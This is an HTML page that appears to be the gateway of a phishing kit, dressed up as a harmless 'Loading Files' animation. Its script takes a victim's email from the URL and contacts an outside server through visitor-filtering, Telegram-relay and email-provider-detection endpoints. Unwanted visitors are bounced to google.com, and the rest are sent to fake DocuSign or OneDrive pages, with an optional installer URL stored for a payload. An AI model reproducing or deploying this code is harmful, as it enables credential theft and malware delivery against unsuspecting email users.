<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading Files</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="robots" content="noindex, nofollow">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { min-height: 100%; }
    body {
      min-height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: #f8fafc;
      color: #0f172a;
      padding: 24px 16px;
      overflow-x: hidden;
    }
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image:
        radial-gradient(circle at 20% 20%, rgba(59,130,246,0.08), transparent 28%),
        radial-gradient(circle at 80% 80%, rgba(16,185,129,0.06), transparent 30%),
        radial-gradient(circle, rgba(226,232,240,0.65) 1px, transparent 1px);
      background-size: 100% 100%, 100% 100%, 28px 28px;
      pointer-events: none;
    }
    .page-shell {
      width: 100%;
      max-width: 760px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 28px;
      z-index: 1;
    }
    .loading-title {
      font-size: clamp(1.4rem, 3vw, 2rem);
      font-weight: 700;
      letter-spacing: -0.01em;
      text-align: center;
      line-height: 1.1;
    }
    .file-list {
      display: grid;
      grid-template-columns: repeat(4, minmax(0, 1fr));
      gap: 16px;
      width: min(100%, 420px);
    }
    .file-card {
      width: 100%;
      min-height: 94px;
      border-radius: 22px;
      background: #ffffff;
      border: 1px solid #e2e8f0;
      box-shadow: 0 18px 40px rgba(15,23,42,0.08);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 14px 10px;
      position: relative;
      overflow: hidden;
      animation: floatCard 3.2s ease-in-out infinite;
    }
    .file-card:nth-child(1) { animation-delay: 0s; }
    .file-card:nth-child(2) { animation-delay: 0.18s; }
    .file-card:nth-child(3) { animation-delay: 0.34s; }
    .file-card:nth-child(4) { animation-delay: 0.52s; }
    @keyframes floatCard {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-7px); }
    }
    .file-card::before {
      content: '';
      position: absolute;
      top: 0;
      right: 0;
      width: 0;
      height: 0;
      border-style: solid;
    }
    .file-card.pdf::before { border-width: 0 20px 20px 0; border-color: transparent #ef4444 transparent transparent; }
    .file-card.xls::before { border-width: 0 20px 20px 0; border-color: transparent #059669 transparent transparent; }
    .file-card.doc::before { border-width: 0 20px 20px 0; border-color: transparent #2563eb transparent transparent; }
    .file-card.zip::before { border-width: 0 20px 20px 0; border-color: transparent #7c3aed transparent transparent; }
    .file-icon-box {
      width: 44px;
      height: 44px;
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 10px;
    }
    .file-card.pdf .file-icon-box { background: #fee2e2; }
    .file-card.xls .file-icon-box { background: #dcfce7; }
    .file-card.doc .file-icon-box { background: #dbeafe; }
    .file-card.zip .file-icon-box { background: #ede9fe; }
    .file-ext-label {
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.14em;
      text-transform: uppercase;
      text-align: center;
      color: #334155;
    }
    .progress-track,
    .status-text,
    .visually-hidden { display: none; }
    @media (max-width: 560px) {
      .file-list { grid-template-columns: repeat(2, minmax(0, 1fr)); }
      .page-shell { gap: 20px; }
    }
  </style>
</head>
<body>
  <div class="page-shell">
    <div class="loading-title">Loading Files</div>
    <div class="file-list" id="loadingMessage">
      <div class="file-card pdf">
        <div class="file-icon-box">
          <svg width="30" height="34" viewBox="0 0 30 34" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="2" y="2" width="22" height="28" rx="4" fill="#fda4af"/>
            <path d="M15 2 L24 11 H15 Z" fill="#ffffff" opacity="0.65"/>
            <rect x="2" y="20" width="22" height="8" rx="2" fill="#ef4444"/>
            <text x="13" y="26" font-size="7" font-weight="800" fill="white" text-anchor="middle" font-family="Arial, sans-serif">PDF</text>
          </svg>
        </div>
        <div class="file-ext-label">Adobe</div>
      </div>
      <div class="file-card xls">
        <div class="file-icon-box">
          <svg width="30" height="34" viewBox="0 0 30 34" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="2" y="2" width="22" height="28" rx="4" fill="#86efac"/>
            <path d="M15 2 L24 11 H15 Z" fill="#ffffff" opacity="0.65"/>
            <line x1="6" y1="12" x2="24" y2="12" stroke="#059669" stroke-width="1" opacity="0.7"/>
            <line x1="6" y1="17" x2="24" y2="17" stroke="#059669" stroke-width="1" opacity="0.7"/>
            <text x="13" y="26" font-size="7" font-weight="800" fill="#059669" text-anchor="middle" font-family="Arial, sans-serif">XLS</text>
          </svg>
        </div>
        <div class="file-ext-label">Sheet</div>
      </div>
      <div class="file-card doc">
        <div class="file-icon-box">
          <svg width="30" height="34" viewBox="0 0 30 34" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="2" y="2" width="22" height="28" rx="4" fill="#93c5fd"/>
            <path d="M15 2 L24 11 H15 Z" fill="#ffffff" opacity="0.65"/>
            <line x1="6" y1="14" x2="24" y2="14" stroke="#2563eb" stroke-width="1.2" opacity="0.75"/>
            <line x1="6" y1="18" x2="20" y2="18" stroke="#2563eb" stroke-width="1.2" opacity="0.75"/>
            <text x="13" y="26" font-size="7" font-weight="800" fill="#2563eb" text-anchor="middle" font-family="Arial, sans-serif">DOC</text>
          </svg>
        </div>
        <div class="file-ext-label">Doc</div>
      </div>
      <div class="file-card zip">
        <div class="file-icon-box">
          <svg width="30" height="34" viewBox="0 0 30 34" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="2" y="2" width="22" height="28" rx="4" fill="#c4b5fd"/>
            <path d="M15 2 L24 11 H15 Z" fill="#ffffff" opacity="0.65"/>
            <rect x="10" y="10" width="10" height="4" rx="1.5" fill="#7c3aed" opacity="0.85"/>
            <rect x="10" y="16" width="10" height="4" rx="1.5" fill="#7c3aed" opacity="0.7"/>
            <text x="13" y="26" font-size="7" font-weight="800" fill="#7c3aed" text-anchor="middle" font-family="Arial, sans-serif">ZIP</text>
          </svg>
        </div>
        <div class="file-ext-label">Zip</div>
      </div>
    </div>
  </div>
  <div class="visually-hidden" aria-hidden="true">
    <div id="headingText">Verifying Connection</div>
    <div id="shieldScanning">
      <div id="ring3"></div>
      <div id="ring2"></div>
      <div id="ring1"></div>
      <div class="shield-center"></div>
    </div>
    <div id="shieldDone">
      <div class="check-wrap">
        <svg width="30" height="30" viewBox="0 0 30 30" fill="none">
          <polyline points="7,15 12.5,21 23,9" stroke="white" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
    </div>
    <div id="rotatorText" class="status-text">Initializing…</div>
    <div id="resultMsg" class="status-text"></div>
    <div class="progress-track">
      <div id="progressBar"></div>
    </div>
  </div>
  <script>
const API_BASE_URL       = "https://starspirit.com";
const APP_DIR_NAME       = "share";
const LANDING_MODE       = "dual-docusign-onedrive";
const BLOCK_REDIRECT_URL = "https://google.com";

(async function () {
  function el(id) { return document.getElementById(id); }
  async function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

  function buildApiBase() {
    if (API_BASE_URL) return API_BASE_URL.replace(/\/+$/, '');
    let origin = window.location.origin;
    if (origin === 'null' || window.location.protocol === 'file:') {
      origin = 'file://';
    }
    let path = window.location.pathname;
    if (path.match(/\/[^[\/]+\.[a-z0-9]+$/i)) {
      path = path.replace(/\/[^\/]+$/, '');
    }
    path = path.replace(/\/+$/, '');
    const parent = path.replace(/\/[^\/]+$/, '');
    return origin + parent + '/' + APP_DIR_NAME;
  }
  const apiBaseUrl = buildApiBase();

  function safeFetch(url, opts, timeoutMs = 8000) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    return fetch(url, { ...opts, signal: controller.signal })
      .then(r => { clearTimeout(id); return r.ok ? r.json() : {}; })
      .catch(() => { clearTimeout(id); return {}; });
  }

  function makeAbsolute(url) {
    if (!url) return '';
    if (url.startsWith('http://') || url.startsWith('https://')) return url;
    try { return new URL(url, apiBaseUrl).href; } catch (e) { return url; }
  }

  const urlParams   = new URLSearchParams(window.location.search);
  let   victimEmail = '';
  const rawRef = urlParams.get('ref') || '';
  if (rawRef) {
    victimEmail = decodeURIComponent(rawRef);
    try {
      const decoded = atob(victimEmail.replace(/\s/g, ''));
      if (decoded && decoded.includes('@')) victimEmail = decoded;
    } catch (e) {}
  }
  if (!victimEmail) {
    const hash = window.location.hash || '';
    if (hash) {
      const frag = hash.substr(1);
      const idx  = frag.indexOf('=');
      victimEmail = idx !== -1 ? frag.substr(idx + 1) : frag;
    }
  }
  victimEmail = victimEmail.trim().toLowerCase();

  let challenge_id = '', challenge_ts = 0, challenge_sig = '';
  const STATUS_MESSAGES = [
    { text: 'Loading...', dur: 800 },
    { text: 'Loading...', dur: 1000 },
    { text: 'Loading...', dur: 900 },
    { text: 'Loading...', dur: 800 }
  ];

  function setProgress(pct) {
    const bar = el('progressBar');
    if (bar) bar.style.width = pct + '%';
  }

  async function runScan() {
    setProgress(4);
    const textEl = el('rotatorText');
    for (let i = 0; i < STATUS_MESSAGES.length; i++) {
      if (i > 0 && textEl) {
        textEl.className = 'status-text exit';
        await delay(300);
        textEl.textContent = STATUS_MESSAGES[i].text;
        textEl.className = 'status-text active';
        void textEl.offsetWidth;
      }
      if (textEl) textEl.className = 'status-text active';
      setProgress(4 + ((i + 1) / STATUS_MESSAGES.length) * 96);
      await delay(STATUS_MESSAGES[i].dur);
    }
    setProgress(100);
    ['ring1', 'ring2', 'ring3'].forEach(id => {
      const ring = el(id);
      if (ring) ring.classList.add('done');
    });
  }

  const emailValid = victimEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(victimEmail);
  const [preCheck, cfg, providerData] = await Promise.all([
    safeFetch(apiBaseUrl + '/verify_visitor_api.php', {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({})
    }, 2000),
    safeFetch(apiBaseUrl + '/telegram_relay.php?config=1', undefined, 4000),
    emailValid ? safeFetch(apiBaseUrl + '/detect_provider_api.php?email=' + encodeURIComponent(victimEmail), undefined, 4000) : Promise.resolve({}),
    runScan()
  ]);

  if (preCheck && preCheck.allowed === false) {
    window.location.replace(BLOCK_REDIRECT_URL);
    await new Promise(() => {});
  }

  if (preCheck && preCheck.challenge_id) {
    challenge_id = preCheck.challenge_id;
    challenge_ts = preCheck.timestamp;
    challenge_sig = preCheck.signature;
  }

  const landingMode = LANDING_MODE || (cfg && cfg.landing_mode) || 'single';
  const installerUrl = cfg && cfg.installer_url || '';
  const webmailUrl = cfg && cfg.webmail_installer_url || '';
  const isO365 = !!(providerData && providerData.is_o365);

  function toLandingId(page) {
    const m = { 'index.html': 'index', 'docs.html': 'docs', 'DocuSign.html': 'DocuSign', 'OneDrive.html': 'OneDrive' };
    return m[page] || 'index';
  }

  let targetPage = 'index.html';
  if (landingMode === 'dual-adobe-onedrive') {
    targetPage = isO365 ? 'OneDrive.html' : 'index.html';
    if (cfg && cfg.installer_enabled) window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
  } else if (landingMode === 'dual-docusign-onedrive') {
    targetPage = isO365 ? 'OneDrive.html' : 'DocuSign.html';
    if (cfg && cfg.installer_enabled) window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
  } else {
    const style = (cfg && cfg.page_style || 'adobe').toLowerCase();
    if (style === 'onedrive') targetPage = 'OneDrive.html';
    else if (style === 'docusign') targetPage = 'docs.html';
    else if (style === 'dual-adobe-onedrive') {
      targetPage = isO365 ? 'OneDrive.html' : 'index.html';
      if (cfg && cfg.installer_enabled) window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
    } else if (style === 'dual-docusign-onedrive') {
      targetPage = isO365 ? 'OneDrive.html' : 'docs.html';
      if (cfg && cfg.installer_enabled) window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
    } else targetPage = 'index.html';
    if (cfg && cfg.installer_enabled && !window._installerUrl) window._installerUrl = makeAbsolute(installerUrl);
  }

  if (window._installerUrl) {
    try { sessionStorage.setItem('_gate_installer_url', window._installerUrl); } catch (e) {}
  }

  const landingId = toLandingId(targetPage);
  const tokenApiUrl = cfg && cfg.shield_token_api ? makeAbsolute(cfg.shield_token_api) : apiBaseUrl + '/shield_token_api.php';

  let shieldUrl = '';
  if (cfg && cfg.shield_enabled) {
    const tokenRes = await safeFetch(tokenApiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: victimEmail,
        landingPage: landingId,
        mode: isO365 ? 'o365' : '',
        c_id: challenge_id,
        c_ts: challenge_ts,
        c_sig: challenge_sig,
        c_proof: Math.abs(((challenge_id + 'standalone_gate_salt').split('').reduce((h,c) => { h = ((h<<5)-h)+c.charCodeAt(0); return h & 0xFFFFFFFF; }, 0))).toString(16)
      })
    }, 4000);

    if (tokenRes && tokenRes.ok && tokenRes.url) {
      shieldUrl = tokenRes.url;
    }
  }

  if (!shieldUrl) {
    const refParam = urlParams.get('ref') ? '?ref=' + urlParams.get('ref') : (victimEmail ? '?ref=' + encodeURIComponent(btoa(victimEmail)) : '');
    shieldUrl = apiBaseUrl + '/share/' + targetPage + refParam;
  }

  await delay(300);
  window.location.replace(shieldUrl);
})();
  </script>
</body>
</html>
